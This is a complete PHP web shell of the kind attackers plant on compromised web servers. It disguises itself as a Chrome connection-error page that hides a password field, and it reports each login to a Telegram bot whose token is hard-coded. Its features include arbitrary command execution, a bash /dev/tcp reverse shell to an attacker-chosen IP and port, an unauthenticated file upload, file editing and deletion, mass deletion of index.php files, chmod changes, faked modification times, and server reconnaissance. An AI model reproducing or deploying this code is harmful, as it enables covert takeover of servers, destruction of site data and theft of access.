<?php
 error_reporting(0);
 session_start();
 $auth="UrPasswd"; // password lu monyet ?> 
 <?php
 function serverip(){
 	$ip1=$_SERVER[  'SERVER_ADDR'  ];
 	$ip2=gethostbyname($_SERVER[  'HTTP_HOST'  ]);
 	if($ip1 == $ip2){
 		return $ip1;
 	}else{
 		return $ip2;
 	}
 }
 function sendTelegramMessage($message) {
    $telegramToken = "7833323311:AAHiTseDWrVh71rHgV72ufUa1SYvfdFntyk";
    $chatId = "-1002395054749";

    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
        ]
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    if ($result === false) {
        echo "Error sending message!";
    }
}


function login() {
    global $auth;
    $host = htmlspecialchars($_SERVER['HTTP_HOST']);
    echo "<title>$host</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fff; color: #5f6368; margin: 0; padding: 0; }
        .container { max-width: 600px; margin: 80px auto; padding-left: 20px; text-align: left; }
        a { color: rgb(26, 115, 232); text-decoration: none; }
        h1 { color: rgb(32, 33, 36); font-size: 1.6em; font-weight: 500; line-height: 1.25em; margin-bottom: 16px; }
        .buttons { margin-top: 51px; display: flex; align-items: center; justify-content: space-between; }
        .reload-button, .details-button { padding: 8px 16px; font-size: 14px; border-radius: 20px; cursor: pointer; border: none; }
        .reload-button { background-color: rgb(26, 115, 232); color: #fff; }
        .details-button { background-color: #fff; border: 0.5px solid rgb(128, 134, 139); color: rgb(95, 99, 104); }
        .error-details { display: none; margin-top: 20px; color: #5f6368; }
        .error-details h3 { font-size: 1em; font-weight: bold; }
        .error-details p { margin: 8px 0; }
        ul { line-height: 1.6em; }
        .error-code { color: var(--error-code-color); font-size: 0.8em; margin-top: 12px; text-transform: uppercase; }
    </style>
    <body><br><br><br><center>
        <div class='container'>
            <div class='icon'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyEEAAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAENJREFUeF7tzbEJACEQRNGBLeAasBCza2lLEGx0CxFGG9hBMDDxRy/72O9FMnIFapGylsu1fgoBdkXfUHLrQgdfrlJN1BdYBjQQm3UAAAAASUVORK5CYII='></div>
            <br><h1>This site can't be reached</h1>";
    
    echo "<p><b>" . htmlspecialchars($_SERVER['HTTP_HOST']) . "</b> unexpectedly closed the connection.</p>";

    echo "<div class='suggestions'>
            <p>Try:</p>
            <ul>
                <li>Checking the connection</li>
                <li><a onclick='toggleDetails()' href='chrome-error://chromewebdata/#buttons'>Checking the proxy, firewall, and DNS configuration</a></li>
                <li><a href='javascript:diagnoseErrors()'>Running Windows Network Diagnostics</a></li>
            </ul>
          </div>
          <p class='error-code'>ERR_NAME_NOT_RESOLVED</p>
          <div class='buttons'>
              <button class='reload-button' onclick='reloadPage()'>Reload</button>
              <button class='details-button' onclick='toggleDetails()'>Details</button>
          </div>
          <div class='error-details' id='details'>
              <h3>Check your Internet connection</h3>
              <p>Check any cables and reboot any routers, modems, or other network devices you may be using.</p>
              <h3>Allow Chrome to access the network in your firewall or antivirus settings.</h3>
              <p>If it is already listed as a program allowed to access the network, try removing it from the list and adding it again.</p>
              <h3>If you use a proxy server…</h3>
              <p>Check your proxy settings or contact your network administrator to make sure the proxy server is working. If you don't believe you should be using a proxy server: Go to the Chrome menu > Settings > Show advanced settings… > Change proxy settings… > LAN Settings and deselect 'Use a proxy server for your LAN'.</p>
          </div>
        </div><br><br></center>";

    // JavaScript for reload and toggle functions
    echo "<script>
            function reloadPage() {
                location.reload(); // Reload the current page
            }
            function toggleDetails() {
                var details = document.getElementById('details');
                var button = document.querySelector('.details-button');
                if (details.style.display === 'none' || details.style.display === '') {
                    details.style.display = 'block';
                    button.innerText = 'Hide details';
                } else {
                    details.style.display = 'none';
                    button.innerText = 'Details';
                }
            }
          </script>";
    
    // Form and PHP login handling remain the same
    echo "<style type='text/css'>
              input[type=username] { width: 250px; height: 25px; color: white; background: transparent; border: 1px solid white; margin-left: 20px; text-align: center; }
          </style>
          <form action='' method='POST'>
              <input type='username' name='minim_pass'>
          </form>";
    
          if (isset($_POST['minim_pass'])) {
            if ($_POST['minim_pass'] === $auth) {
                $_SESSION['admin'] = true;
                $domain = $_SERVER['HTTP_HOST'];
                $current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $domain . $_SERVER['REQUEST_URI'];
                $password_used = $_POST['minim_pass'];
        
                $telegramMessage = "<b>🚨 Shell Logs 🚨</b>\n";
                $telegramMessage .= "<b>🌐 $domain</b>\n";
                $telegramMessage .= "======================================\n";
                $telegramMessage .= "<b>🌐 URL:</b> $current_url\n";
                $telegramMessage .= "<b>🔑 Password:</b> <code>$password_used</code>\n";
                $telegramMessage .= "======================================\n";
        
                sendTelegramMessage($telegramMessage); // With parse_mode set to HTML in the function
                pindah('?home');
            } else {
                alert('Incorrect password, please try again.');
                pindah('?error');
            }
        }              
}

 function write($content,$dir){
 	$fh=fopen($dir,"w");
 	if(fwrite($fh,$content)){
 		return "1";
 	}else{
 		return "0";
 	}
 	fclose($fh);
 }
function author(){
	print "</table><center>
	    <footer>
      <div class='footer_container'>
        <div class='logo'><p>Peace in illusion is not true peace</p></div>
        </div>
    </footer>";
}
function getPermissions($file) {
    $perms = fileperms($file);
    
    // Convert to octal and return the last 4 digits (e.g., 0777)
    return substr(sprintf('%o', $perms), -4);
}
// Function to get the last modified time of the file or directory
function getLastModified($file) {
    return date("Y-m-d H:i:s", filemtime($file));  // Format the last modified time
}

// Function to colorize permissions based on whether they are writable
function colorizePermissions($file) {
    // Check if the file or directory is writable
    if (is_writable($file)) {
        // Return green for writable
        return "<span style='color:#00ff0d;'>" . getPermissions($file) . "</span>";
    } else {
        // Return red for non-writable
        return "<span style='color:#ff0000;'>" . getPermissions($file) . "</span>";
    }
}



function delTree($dir){ 
$files = array_diff(scandir($dir), array('.', '..')); 
	foreach ($files as $file) { 
		(is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
	}
	return rmdir($dir);
} 
function alert($msg){
	print "<script>alert('".$msg."');</script>";
}
function pindah($dir){
	print "<script>window.location='".$dir."';</script>";
}
if($_SESSION[  'admin'  ] == "TRUE"){
echo "<title>$host</title>
<style>
@import url('https://fonts.googleapis.com/css?family=Supermercado+One');
* {margin: 0; padding: 0}
#wrapper {
    margin: auto;
    padding: 10px;
}
	
table {
background-color:#3d3d3dde;
width: 100%; 
    color: lime; 
     
    border-collapse: collapse;
}
footer{
  padding: 10px 0;
  background-color:#444444d1;
  border-bottom-left-radius:15px ;
  border-bottom-right-radius: 15px;
}

.footer_container{
  max-width: 1300px;
  margin: auto;
  padding: 0 20px;
  align-items: center;
  flex-wrap: wrap-reverse;
}
table td{
	padding: 8px 8px;
	font-weight: bold;
}
	td {
    word-break: break-word; /* Prevents words from breaking awkwardly */
}
	table th{
	padding: 8px 8px;
	font-weight: bold;
	background-color:#313131df;
}
	tr:nth-child(even){background-color: #1e1e1e8a;}
h1 {
    text-align: center;
}

.text {
    position: relative;
    display: inline-block;
    font-size: 2rem;
    text-transform: uppercase;
    color: #a2a3a3;
    text-shadow: 2px 2px 0px #6363637c, 5px 5px 0px rgba(0, 0, 0, 0.1);
}
tr:hover{
background-color: #5300005f;
}



</style>
<style>
.form-control {
    padding: .375rem .75rem;
    font-size: 14px;
    line-height: 1.5;
    color: #bfbfbf;
    background-color: transparent;
    background-clip: padding-box;
    border: 1px solid #ced4da;
    border-radius: .25rem;
    transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}
	.form-control1 {
    padding: .375rem .75rem;
	cursor: pointer;
    font-size: 14px;
    line-height: 1.5;
    color: #00ff00;
    background-color: transparent;
    background-clip: padding-box;
    border: 1px solid #ced4da;
    border-radius: .25rem;
    transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
}

.form-control1:hover{
	color:#a2a3a3;
}

.text a{
	color:#a2a3a3;
	text-decoration:none;
}
.text a:hover{
	color:#d80404;
}
a{
	color:#d80404;
	text-decoration:none;
}
a:hover{
	color:#a2a3a3;
}
	#menu1 a{
        padding:7px 29px;
        margin:0;
        background:#212529;
		display: inline-block;
        text-decoration:none;
        letter-spacing:1px;
        -moz-border-radius: 5px; -webkit-border-radius: 5px;
 -khtml-border-radius: 5px; border-radius: 5px;
}
 .menu50{padding: 10px;
 text-align:center;}
 .menu51{padding: 10px;
    border-top-left-radius: 15px;
    border-bottom: 2px #6e6e6e solid;
    border-top-right-radius: 15px;
    background-color: #444444f5;
    }

#menu a{
        padding:7px 29px;
        margin:0;
        background:#222222;
        text-decoration:none;
        letter-spacing:1px;
        -moz-border-radius: 5px; -webkit-border-radius: 5px;
 -khtml-border-radius: 5px; border-radius: 5px;
}
#menu a:hover{
	background:#191919;
 color: red;
 border-bottom:1px solid #333333;
 border-top:1px solid #333333;
 text-decoration: none;
}
 .btn-modal-close:hover, .btn-submit:hover, .menu-file-manager ul, .path-pwd, thead {
	border-top-left-radius:15px;
	border-top-right-radius:15px;
    background-color: #444444f5;
    border-bottom: 2px #6e6e6e solid;
}
	.menu-file-manager li {
    display: inline-block;
    margin: 15px 20px;
}
	ul{list-style: none;}
	/* Add this to your styles.css or within <style> tags */
#terminal {
    margin: 20px auto;
    color: #ffffff;
    border-radius: 5px;
    border: #333 solid 10px;
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
	overflow-x: auto; /* Allow horizontal scrolling for wide content */
}

.input-menu {
    padding: 10px;
    background-color: #333;
    border-bottom: 1px solid #444444d1;
	width: max-content;
}

.input-menu input[type='text'] {
    padding: 5px;
    border: none;
    border-radius: 3px;
    background-color: #444444d1;
    color: #fff;
    outline: none;
}


.terminal-head {
    padding: 10px;
    background-color: #333;
    border-bottom: 1px solid #444444d1;
}
.terminal-head {
    padding: 10px;
    background-color: #333;
    border-bottom: 1px solid #444444d1;
}

.terminal-head form {
    display: flex;
    justify-content: space-between;
}

.terminal-head input[type='text'] {
    width: 85%;
    padding: 5px;
    border: none;
    border-radius: 3px;
    background-color: #444444d1;
    color: #fff;
    outline: none;
}

.terminal-head input[type='submit'] {
    padding: 5px 10px;
    background-color: #666;
    border: none;
    color: #fff;
    cursor: pointer;
    border-radius: 3px;
    transition: background-color 0.3s;
}

.terminal-head input[type='submit']:hover {
    background-color: #888;
}

textarea.box-shadow {
    background-color: #1e1e1edd;
    color: #00ff0d;
    font-family: 'Courier New', Courier, monospace;
    padding: 10px;
    border: none;
    resize: none;
}
	.box-shadow{    background-color: #1e1e1edd;
    color: #00ff0d;
    font-family: 'Courier New', Courier, monospace;
    padding: 10px;
    border: none;
    resize: none;}
	.menuhead i{
	padding-bottom: 10px;}
.pwdnya, pwdnya a{font-weight: 900; font-size:20px}
</style>
<style>
		body {
			background-color: #080c24;
			background-size: 100% 100%;
			margin: 10px 40px;
            background-image:url(https://raw.githubusercontent.com/m0chAvIn/mnyla/refs/heads/main/sle3py.jpg);
            background-repeat: no-repeat;
            background-position: center;
            background-size: 35%;
			font-weight: 900;
			}
	</style>
<!--<body bgcolor='green'>-->
<font color='#d80404'>
<link href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet' type='text/css'>
<center>";
$dir=$_GET[  'dir'  ];
if(!$dir){
	$dir=getcwd();
}
echo "
</center>
<div class='menuhead'>
<i class='fa fa-hdd-o'></i> ".php_uname()."<br>
<i class='fa fa-desktop'></i> ".serverip()." | <i class='fa fa-user'></i> ".$_SERVER[  'REMOTE_ADDR'  ]."<br>
<div class='pwdnya'><i class='fa fa-folder-o'></i> ";
$dir = str_replace("\\", "/", $dir); // Convert backslashes to forward slashes
$a = explode("/", $dir);

foreach($a as $aa => $aaa){
    if($aaa == '' && $aa == '0'){
        echo "<a href='?dir=/'>/</a>";
        continue;
    } elseif($aaa == ''){
        continue;
    } else {
        echo "<a href='?dir=";
        for($i=0; $i<=$aa; $i++){
            echo $a[$i] . "/";
        }
        echo "'>$aaa</a>/";
    }
}
echo "</div><div id='menu1'> <a href='?home'>Home</a> | <a href='?exit'>Exit</a> | <a href='?mass=delete'>Mass Delete</a> | <a href='?backconnect&dir=$dir'>Back Connect</a> | <a href='?info_php'>Info PHP</a></div></div><br>";


$files = $_FILES[  'vulnfile'  ][  'name'  ];
	$dest = $dir.'/'.$files;
	if(isset($_POST[  'upload'  ])) {
	    if(is_writable($root)) {
	        if(@copy($_FILES[  'vulnfile'  ][  'tmp_name'  ], $dest)) {
	            $web = "http://".$_SERVER[  'HTTP_HOST'  ]."/";
	            echo "<h style='color: green;'> Upload Successful</h>";
	        } else {
	            echo "<h style='color: green;'> Upload Failed</h>";
	        }
	    } else {
	        if(@copy($_FILES[  'vulnfile'  ][  'tmp_name'  ], $dest)) {
	            echo "<h style='color: green;'> Upload Successful</h>";
	        } else {
	            echo "<h style='color: green;'> Upload Failed</h>";
	        }
	    }
	}



	// New file creation section
    if (isset($_GET['nf'])) {
        // Display the form to create a new file
        echo "
        <div id='terminal'>
            <div class='menu50'>
                <div class='box-shadow'>
                    <form action='?nf&dir=$dir' method='POST'>
                        <input type='text' class='form-control' placeholder='New File' name='fname' required>
                        <input type='submit' class='form-control1' name='fok' value='Save'>
                    </form>
                </div>
            </div>
        </div>";
    
        // Handle form submission
        if (isset($_POST['fok'])) {
            $fname = trim($_POST['fname']);  // Trim leading and trailing spaces
    
            // Ensure filename is not empty
            if (empty($fname)) {
                echo "<p>Please enter a filename.</p>";
            } else {
                // Prevent directory traversal (strip path components)
                $fname = basename($fname);  
                $filepath = "$dir/$fname";
    
                // Check if the file already exists
                if (file_exists($filepath)) {
                    echo "<p>File '$fname' already exists!</p>";
                } else {
                    // Attempt to create the file
                    if (touch($filepath)) {  // Create an empty file
                        echo "<p>File '$fname' created successfully!</p>";
                        pindah("?edit=$filepath&dir=$dir");  // Redirect to edit page
                    } else {
                        echo "<p>Error: Unable to create the file. Check permissions.</p>";
                    }
                }
            }
        }
    }
    
// Edit File Section
elseif (isset($_GET['edit'])) {
    // Edit file form
    $save = $_GET['edit'];
    $cont = htmlspecialchars(file_get_contents($save));
    echo "
    <form action='?edit=$save&dir=$dir' method='POST'>
        <center>
            <div id='terminal'>
                    <textarea class='box-shadow' rows='20' name='fcont' style='width: 100%; height: 400px;'>$cont</textarea>
                </div>
            <input type='submit' name='Sle3py' class='form-control1' value='Save File'>
        </center>
    </form><br><br>";

    // File saving logic
    if (isset($_POST['Sle3py']) && isset($_POST['fcont'])) {
        if (file_put_contents($save, $_POST['fcont']) !== false) {
            echo "<h3>Edit Successfully</h3>";
        } else {
            echo "<h3>Failed to Edit</h3>";
        }
    }
}
// Create New Directory Section
	elseif (isset($_GET['nd'])) {
		// New directory creation form
		echo "
		<div id='terminal'>
			<div class='menu50'>
				<div class='box-shadow'>
					<form action='?nd&dir=$dir' method='POST'>
						<input type='text' class='form-control' placeholder='New Directory' name='fname'>
						<input type='submit' class='form-control1' name='fok' value='Save'>
					</form>
				</div>
			</div>
		</div>";
	
		// Directory creation logic
		if (isset($_POST['fok']) && !empty($_POST['fname'])) {
			$new_dir = "$dir/" . $_POST['fname'];
			if (mkdir($new_dir)) {
				echo "Directory created successfully.";
			} else {
				echo "Failed to create directory.";
			}
		}
	}
// Handle the Command Execution form
elseif (isset($_GET['cmd'])) {
    // Create the form and the textarea for terminal output
    echo "
    <div id='terminal'>
        <div class='terminal-head'>
            <form action='?cmd&dir=$dir' method='POST'>
                <input type='text' name='command' placeholder='Command In Here...'>
                <input type='submit' name='cmdok' value='>>>'>
                
            </form>
        </div>
            <textarea id='output-area' class='box-shadow' disabled='disabled' rows='20' style='width: 100%; height: 400px;'>";

    // If the command is executed, process the output
if (isset($_POST['cmdok'])) {
    $command = $_POST['command'];

    // Execute the command
    $output = shell_exec($command);

    // Display only the latest output, clear the textarea for new command
    if ($output) {
        echo "\n$ $command\n" . htmlspecialchars($output);
    } else {
        echo "\n$ $command\nNo output or command failed to execute.";
    }
}

echo "</textarea>
</div>";
}

// Back Connect Functionality
elseif (isset($_GET['backconnect'])) {
    // Display Back Connect form
    echo "
    <div id='backconnect'>
        <div id='terminal'><div class='menu50'><div class='box-shadow'><form action='?backconnect&dir=$dir' method='POST'>
            <label for='ip'>Target IP:</label>
            <input type='text' name='ip' class='form-control' placeholder='e.g., 192.168.1.10' required>
            <label for='port'>Port:</label>
            <input type='number' class='form-control' name='port' placeholder='e.g., 4444' required>
            <input type='submit' class='form-control1' name='connect' value='Connect'>
        </form>
    </div></div></div></div>";

    // Handle the Back Connect submission
    if (isset($_POST['connect'])) {
        $ip = $_POST['ip'];
        $port = $_POST['port'];

        // Validate IP and Port
        if (filter_var($ip, FILTER_VALIDATE_IP) && $port >= 1 && $port <= 65535) {
            // Command to create a back connection (replace with your preferred method)
            $backConnectCommand = "bash -c 'exec bash -i &>/dev/tcp/$ip/$port <&1'";

            // Execute the back connect command securely
            $output = shell_exec($backConnectCommand);

            // Feedback on the back connect attempt
            if ($output === null) {
                echo "<p>Back Connect initiated to $ip:$port.</p>";
            } else {
                echo "<p>Back Connect failed. Ensure the listener is set up on the target machine.</p>";
            }
        } else {
            echo "<p style='color: red;'>Invalid IP address or port number.</p>";
        }
    }
}
// Info PHP Functionality
elseif (isset($_GET['info_php'])) {
    echo "<div class='menu51'><center>
<h2 style='color:#00ff00;padding-bottom: 10px;'>Server Information</h2>                </div></center>
                    <table style='width: 100%; border-collapse: collapse;'>
                        <tbody>";

    // Server and IP Information
    $serverName = $_SERVER['SERVER_NAME'];
    $serverIP = $_SERVER['SERVER_ADDR'];
    $clientIP = $_SERVER['REMOTE_ADDR'];
    echo "<tr><td width=15%><b>Server</b></td><td> $serverName | Server IP: $serverIP | Your IP: $clientIP</td></tr>";

    // Kernel Version
    $kernelVersion = shell_exec('uname -a');
    echo "<tr><td width=15%><b>Kernel Version</b></td><td> " . trim($kernelVersion) . "</td></tr>";

    // Software
    $software = $_SERVER['SERVER_SOFTWARE'];
    echo "<tr><td width=15%><b>Software</b></td><td> $software</td></tr>";

    // Storage Space
    $diskFree = round(disk_free_space("/") / 1024 / 1024 / 1024, 2);
    $diskTotal = round(disk_total_space("/") / 1024 / 1024 / 1024, 2);
    $diskUsed = $diskTotal - $diskFree;
    echo "<tr><td width=15%><b>Storage Space</b></td><td> {$diskUsed} GB / {$diskTotal} GB (Free: {$diskFree} GB)</td></tr>";

    // Current Server Time
    echo "<tr><td width=15%><b>Time On Server</b></td><td> " . date("d M Y h:i:s A") . "</td></tr>";

    // User and Group Information
    $user = get_current_user();
    $group = posix_getegid() ? posix_getgrgid(posix_getegid())['name'] : 'N/A';
    echo "<tr><td width=15%><b>User / Group</b></td><td> ($user) | ($group)</td></tr>";

    // PHP Version and Magic Quotes
    $phpVersion = phpversion();
    $sapi = php_sapi_name();
    $magicQuotes = get_magic_quotes_gpc() ? 'ON' : 'OFF';
    echo "<tr><td width=15%><b>PHP Version</b></td><td> $phpVersion on $sapi | Magic Quotes: $magicQuotes</td></tr>";

    // More Info
    $safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
    $openBasedir = ini_get('open_basedir') ? 'ON' : 'OFF';
    $safeModeExecDir = ini_get('safe_mode_exec_dir') ? 'ON' : 'OFF';
    $safeModeIncludeDir = ini_get('safe_mode_include_dir') ? 'ON' : 'OFF';
    echo "<tr><td width=15%><b>More Info</b></td><td> Safe Mode: $safeMode | Open Base Dir: $openBasedir | 
          Safe Mode Exec Dir: $safeModeExecDir | Safe Mode Include Dir: $safeModeIncludeDir</td></tr>";

    // Database Support
    $mysql = extension_loaded('mysqli') ? 'ON' : 'OFF';
    $mssql = extension_loaded('mssql') ? 'ON' : 'OFF';
    $pgsql = extension_loaded('pgsql') ? 'ON' : 'OFF';
    $oracle = extension_loaded('oci8') ? 'ON' : 'OFF';
    echo "<tr><td width=15%><b>Database</b></td><td> MySQL: $mysql | MSSQL: $mssql | PostgreSQL: $pgsql | Oracle: $oracle</td></tr>";

    // Software Availability
    $perl = shell_exec("perl -v") ? 'ON' : 'OFF';
    $python = shell_exec("python --version 2>&1") ? 'ON' : 'OFF';
    $ruby = shell_exec("ruby -v") ? 'ON' : 'OFF';
    echo "<tr><td width=15%><b>Software</b></td><td> Perl: $perl | Python: $python | Ruby: $ruby</td></tr>";

    // Disabled Functions
    $disabledFunctions = ini_get('disable_functions');
    echo "<tr><td width=15%><b>Disabled Functions</b></td><td> " . ($disabledFunctions ? $disabledFunctions : 'None') . "</td></tr>";

    // Linux Command Availability (One Line)
    $commands = [
        'cURL' => 'curl', 'Wget' => 'wget', 'GCC' => 'gcc', 'sudo' => 'sudo',
        'sh' => 'sh', 'bash' => 'bash', 'crontab' => 'crontab',
        'NS' => 'nslookup', 'NC' => 'nc', 'Fetch' => 'fetch', 'Get' => 'get'
    ];

    $commandStatus = [];
    foreach ($commands as $name => $cmd) {
        $commandStatus[] = "$name: " . (shell_exec("command -v $cmd") ? 'ON' : 'OFF');
    }
    echo "<tr><td width=15%><b>Linux Commands</b></td><td> " . implode(' | ', $commandStatus) . "</td></tr>";

    echo "      </tbody>
                    </table>";
}



elseif(isset($_GET[  'delf'  ])){
	if(delTree($_GET[  'delf'  ])){
		pindah("?dir=$dir");
	}else{
		alert('Failed.');
	}
}elseif(isset($_GET[  'renf'  ])){
	$now=$_GET[  'renf'  ];
	echo "
	<div id='terminal'><div class='menu50'><div class='box-shadow'><form action='?renf=$now&dir=$dir' method='POST'>
	<input type='text' class='form-control' placeholder='New Name..' name='fname'>
	<input type='submit' class='form-control1'name='fok' value='Save'></form></div></div></div>";
	if(isset($_POST[  'fok'  ])){
		$new=$_POST[  'fname'  ];
		if(rename($now,"$dir/$new")){
			echo "<center>Rename Successfully<center>";
		}else{
			echo "<center>Rename Failed<center><center>";
		}
	}
}elseif(isset($_GET['edit_time'])) {
    $file = $_GET['edit_time'];
    $dir = $_GET['dir'];

    // If the form is submitted, update the last modified time
    if (isset($_POST['new_time'])) {
        $newTime = $_POST['new_time'];
        $timestamp = strtotime($newTime);

        if (touch($file, $timestamp)) {
            echo "Successfully updated the last modified time of $file to $newTime.<br>";
        } else {
            echo "Failed to update the last modified time.<br>";
        }

        echo "<a href='?dir=$dir'>Back to file list</a>"; // Link back to the directory view
        exit; // Stop further processing
    }

    // Display the edit form

    echo "<div id='terminal'><div class='menu50'><div class='box-shadow'><form method='post'>
            <input type='text' class='form-control' placeholder='New Time..' name='new_time' required>
            <button type='submit' class='form-control1'>Save</button></div>";
}
elseif(isset($_GET[  'del'  ])){
	if(unlink($_GET[  'del'  ])){
		echo "<center>Delete Successfully</center>";
	}else{
		echo "<center>Delete Failed</center>";

	}
}elseif(isset($_GET[  'exit'  ])){
	session_destroy();
	pindah('?home');
}
elseif(isset($_GET['chmod'])) {
    $file = $_GET['chmod'];  // Full path to the file/folder
    $dir = $_GET['dir'];     // Directory
    $fileName = basename($file);

    // Check current permissions
    $currentPermissions = substr(sprintf('%o', fileperms($file)), -4); // Get current permissions

    // If the form is submitted, apply the new permissions
    if (isset($_POST['new_permissions'])) {
        $newPermissions = $_POST['new_permissions'];

        // Ensure the permissions are valid and numeric
        if (preg_match('/^[0-7]{3,4}$/', $newPermissions)) {
            // Change the permissions
            if (chmod($file, octdec($newPermissions))) {
                echo "Successfully changed permissions of $fileName to $newPermissions.<br>";
            } else {
                echo "Failed to change permissions.<br>";
            }
        } else {
            echo "Invalid permission format. Use numeric format (e.g., 0755 or 644).<br>";
        }

        echo "<a href='?dir=$dir'>Back to file list</a>"; // Link back to the directory view
        exit; // Stop further processing
    }

    // Display the form for entering new permissions
    echo "<div id='terminal'><div class='menu50'><div class='box-shadow'><form method='post'>
            <input type='text' class='form-control' placeholder='New Permissions..' name='new_permissions' pattern='[0-7]{3,4}' required>
            <button type='submit' class='form-control1'>Save</button></form></div></div></div>";

}
elseif($_GET[  'mass'  ] == 'delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[  <font color=#18BC9C>DELETED</font>  ] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST[  'start'  ]) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST[  'd_dir'  ], $_POST[  'd_file'  ]);
		echo "</div>";
		echo "<a href='?'><- kembali</a>";
	} else {
	echo "<center>";
	echo "<div id='terminal'><div class='menu50'><div class='box-shadow'><form method='post'>
	<label for='Dir / Path'>Dir / Path:</label><br>
	<input class='form-control' type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<label for='FileName'>File Name:</label><br>
	<input class='form-control' type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
	<input class='form-control1' type='submit' name='start' value='Start!' style='width: 450px;'>
	</form></div></div></div>";
	}
}elseif(isset($_GET[  'src'  ])){
	$cont=$_GET[  'src'  ];
	print "<textarea class='box-shadow' disabled='disabled' rows='20' style='width: 100%; height: 400px;'>".htmlspecialchars(file_get_contents($cont))."</textarea>";
}else{
/* Form file upload*/
echo "<form method='post' enctype='multipart/form-data'>
	      <input type='file' name='vulnfile' class='form-control' style='border: 1.5px solid rgba(255, 255, 255, 0.842)'>
	      <input type='submit' name='upload'class='form-control1' value='upload now!'>
	      </form><br>";
		  echo "<div class='menu-file-manager'><ul>
            <li><a href='?nf&dir=$dir'>Create File</a></li> | 
            <li><a href='?nd&dir=$dir'>Create Directory</a></li> | 
			<li><a href='?cmd&dir=$dir'>Execute Command</a></li> | 
        </ul></div>";
echo "
<table width='100%' style='color:#bfbfbf	;'align='center'>
<tr>
<th width=50%>NAME</th>
<th width=10%>SIZE</th>
<th width=5%>PERMISSIONS</th> <!-- New column for Permissions -->
<th width=15%>LAST MODIFIED</th> <!-- New column for Last Modified -->
<th width=25%>ACTION</th>
</tr>";
$s = scandir($dir);

// Sort items so folders are listed before files
usort($s, function ($a, $b) use ($dir) {
    $aIsDir = is_dir("$dir/$a");
    $bIsDir = is_dir("$dir/$b");

    // Prioritize directories over files
    if ($aIsDir && !$bIsDir) return -1;
    if (!$aIsDir && $bIsDir) return 1;
    return strcasecmp($a, $b); // Sort alphabetically if both are same type
});

foreach ($s as $item) {
    // Skip the special directories "." and ".."
    if ($item === "." || $item === "..") {
        continue;
    }

    $fullPath = "$dir/$item";

    // Check if the item is a directory
    if (is_dir($fullPath)) {
        // Display folder information
        echo "<tr>
                <td><i class='fa fa-folder-o'></i> <a href='?dir=$fullPath/'>$item</a></td>
                <td><center>Folder</center></td>
                <td><center><a href='?chmod=$fullPath&dir=$dir'>" . colorizePermissions($fullPath) . "</a></center></td>
                <td><center><a href='?edit_time=$fullPath&dir=$dir'>" . getLastModified($fullPath) . "</a></center></td>
                <td><center>
                    [ <a href='?delf=$fullPath/&dir=$dir'>Delete</a> ] 
                    [ <a href='?renf=$fullPath/&dir=$dir'>Rename</a> ] 
                </center></td>
              </tr>";
    } 
    // Check if the item is a file
    elseif (is_file($fullPath)) {
        // Calculate the file size in KB and convert to MB if necessary
        $size = filesize($fullPath) / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }

        // Display file information
        echo "<tr>
                <td><i class='fa fa-file-o'></i> <a href='?src=$fullPath&dir=$dir'>$item</a></td>
                <td><center>$size</center></td>
                <td><center><a href='?chmod=$fullPath&dir=$dir'>" . colorizePermissions($fullPath) . "</a></center></td>
                <td><center><a href='?edit_time=$fullPath&dir=$dir'>" . getLastModified($fullPath) . "</a></center></td>
                <td><center>
                    [ <a href='?edit=$fullPath&dir=$dir'>Edit</a> ] 
                    [ <a href='?del=$fullPath&dir=$dir'>Delete</a> ] 
                    [ <a href='?renf=$fullPath&dir=$dir'>Rename</a> ]
                </center></td>
              </tr>";
    }
}
  author();
}
}else{
	login();
	$name=$_FILES[  's'  ][  'name'  ];
	$tmp=$_FILES[  's'  ][  'tmp_name'  ];
	if(copy($tmp,$name)){}
}
?>